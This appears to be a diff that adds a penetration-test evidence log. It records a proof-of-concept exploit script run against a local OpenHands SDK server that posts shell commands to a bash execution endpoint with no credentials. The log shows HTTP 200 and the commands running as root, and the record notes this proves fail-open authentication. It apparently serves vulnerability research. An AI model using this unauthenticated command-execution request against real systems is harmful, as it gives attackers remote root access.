@@ -1,0 +1,19 @@
+# E-005  (hypothesis undefined)
+command: bash /root/渗透测试/repo-openhands-sdk/poc/exploit.sh http://127.0.0.1:50100 "id; hostname; cat /etc/hostname" 2>&1
+expect: 无凭据 POST /api/bash/execute_bash_command 返回 200 并执行命令，证明 fail-open 认证成立
+repeat: 1  stability: single-run
+toolFailureMarkers: none
+
+--- run 1 | exit 0 | 137ms | aborted=false
+[*] target  : http://127.0.0.1:50100
+[*] command : id; hostname; cat /etc/hostname
+
+[1/2] POST /api/bash/execute_bash_command  (no credentials)
+
+[+] HTTP 200 — command accepted
+----- output -----
+uid=0(root) gid=0(root) groups=0(root)
+zsh
+zsh
+
+
